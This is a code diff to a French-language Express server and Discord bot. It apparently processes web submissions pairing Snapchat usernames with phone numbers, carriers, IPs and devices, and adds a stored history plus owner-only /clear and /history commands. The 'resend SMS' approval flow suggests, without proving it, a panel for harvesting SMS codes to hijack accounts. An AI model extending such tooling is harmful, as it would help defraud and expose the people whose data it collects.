@@ -84,6 +84,24 @@ function saveRequests(map) {
 
 const requests = loadRequests();
 
+// ================== HISTORIQUE (50 dernières demandes) ==================
+const HISTORY_FILE = path.join(__dirname, 'history.json');
+function loadHistory() {
+    try {
+        if (fs.existsSync(HISTORY_FILE)) return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
+    } catch (e) {}
+    return [];
+}
+function saveHistory(arr) {
+    try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(arr, null, 2), 'utf8'); } catch (e) {}
+}
+let history = loadHistory();
+function pushHistory(entry) {
+    history.unshift(entry); // plus récent en premier
+    if (history.length > 50) history = history.slice(0, 50);
+    saveHistory(history);
+}
+
 // ================== RATE LIMITING ==================
 const rateLimitMap = new Map(); // IP → timestamp dernière soumission
 function isRateLimited(ip) {
@@ -166,9 +184,9 @@ app.post('/api/submit', async (req, res) => {
         return res.status(400).json({ error: 'Champs manquants' });
     }
 
-    // Site désactivé
+    // Site désactivé — réponse JSON pour l'API
     if (!cfg.site_actif) {
-        return res.status(503).json({ error: 'Le site est temporairement indisponible.' });
+        return res.status(503).json({ error: 'site_disabled' });
     }
 
     // Rate limiting
@@ -189,6 +207,9 @@ app.post('/api/submit', async (req, res) => {
     };
     requests.set(id, requestData);
     saveRequests(requests);
+
+    // Historique
+    pushHistory({ id, snapchat, phone, operator, ip, device, os, createdAt: requestData.createdAt, status: 'pending' });
 
     // Stats
     resetStatsIfNewDay();
@@ -262,7 +283,7 @@ app.post('/api/submit', async (req, res) => {
                     new ButtonBuilder().setCustomId(`resend_${id}`).setLabel('📲 Renvoyer SMS').setStyle(ButtonStyle.Secondary)
                 );
 
-            // 1. Salon prioritaire EN PREMIER (si activé)
+            // 1. Salon prioritaire EN PREMIER (si activé) + mention owner
             if (priorityChannel) {
                 const priorityEmbed = new EmbedBuilder()
                     .setTitle('👁️ [PRIORITAIRE] Nouvelle demande')
@@ -270,7 +291,7 @@ app.post('/api/submit', async (req, res) => {
                     .addFields(...baseFields)
                     .setFooter({ text: `Lecture seule — le salon principal reçoit dans ${cfg.delai_discord_sec}s` })
                     .setTimestamp();
-                await priorityChannel.send({ embeds: [priorityEmbed] });
+                await priorityChannel.send({ content: `<@${OWNER_ID}> 🔔 Nouvelle demande !`, embeds: [priorityEmbed] });
             }
 
             // 2. Salon principal après le délai configuré
@@ -460,6 +481,56 @@ client.on('interactionCreate', async interaction => {
         });
     }
 
+    // /clear — OWNER ONLY
+    if (interaction.commandName === 'clear') {
+        if (!isOwner(interaction.user.id)) {
+            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
+        }
+        const pending = [...requests.entries()].filter(([, r]) => !r.approved && !r.rejected);
+        if (pending.length === 0) {
+            return interaction.reply({ content: '✅ Aucune demande en attente.', ephemeral: true });
+        }
+        for (const [id, r] of pending) {
+            r.rejected = true;
+        }
+        saveRequests(requests);
+        // Mettre à jour le statut historique
+        for (const entry of history) {
+            if (pending.find(([id]) => id === entry.id)) entry.status = 'cleared';
+        }
+        saveHistory(history);
+        return interaction.reply({
+            content: `🗑️ **${pending.length} demande(s)** en attente vidées.`,
+            ephemeral: true
+        });
+    }
+
+    // /history — OWNER ONLY
+    if (interaction.commandName === 'history') {
+        if (!isOwner(interaction.user.id)) {
+            return interaction.reply({ content: '🚫 Tu n\'as pas accès à cette commande.', ephemeral: true });
+        }
+        const last10 = history.slice(0, 10);
+        if (last10.length === 0) {
+            return interaction.reply({ content: '📭 Aucune demande dans l\'historique.', ephemeral: true });
+        }
+        const statusEmoji = { pending: '⏳', approved: '✅', rejected: '❌', cleared: '🗑️' };
+        const lines = last10.map((e, i) => {
+            const date = new Date(e.createdAt).toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+            const emoji = statusEmoji[e.status] || '❓';
+            return `${emoji} **${e.snapchat}** | ${e.phone} | ${e.operator} | \`${date}\``;
+        });
+        return interaction.reply({
+            embeds: [new EmbedBuilder()
+                .setTitle('📋 10 dernières demandes')
+                .setColor(0xFFFC00)
+                .setDescription(lines.join('\n'))
+                .setTimestamp()
+            ],
+            ephemeral: true
+        });
+    }
+
     // /config — OWNER ONLY
     if (interaction.commandName === 'config') {
         if (!isOwner(interaction.user.id)) {
@@ -635,6 +706,16 @@ client.once('ready', async () => {
                     .toJSON(),
 
                 new SlashCommandBuilder()
+                    .setName('clear')
+                    .setDescription('🗑️ Vider toutes les demandes en attente [OWNER ONLY]')
+                    .toJSON(),
+
+                new SlashCommandBuilder()
+                    .setName('history')
+                    .setDescription('📋 Voir les 10 dernières demandes [OWNER ONLY]')
+                    .toJSON(),
+
+                new SlashCommandBuilder()
                     .setName('config')
                     .setDescription('⚙️ Gérer les paramètres du site/bot [OWNER ONLY]')
                     .addSubcommand(sub => sub
@@ -673,7 +754,7 @@ client.once('ready', async () => {
                     .toJSON(),
             ]
         });
-        console.log('✅ Slash commands enregistrées (/stats, /config)');
+        console.log('✅ Slash commands enregistrées (/stats, /config, /clear, /history)');
     } catch (e) {
         console.error('Erreur enregistrement slash commands:', e.message);
     }
